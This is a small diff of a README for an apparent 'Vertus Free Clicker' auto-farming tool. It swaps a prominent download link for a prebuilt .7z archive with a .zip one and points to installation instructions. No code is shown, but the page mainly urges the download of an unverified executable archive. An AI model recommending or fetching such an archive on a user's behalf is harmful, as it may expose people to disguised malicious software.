@@ -1,4 +1,4 @@
-# [DOWNLOAD](https://github.com/robot93leokarshiev/Vertus-Free-Clicker/releases/download/Download/Vertus_Autofarm_x64_x86bit.7z)
+# [DOWNLOAD](https://github.com/robot93leokarshiev/Vertus-Free-Clicker/releases/download/Download/Vertus_Autofarm_x64_x86bit.zip)
 # [Click here to view installation instructions](https://github.com/robot93leokarshiev/Vertus-Free-Clicker/blob/main/Installation%20instructions.txt)
 ## ✨Features:
 - Autoclicker
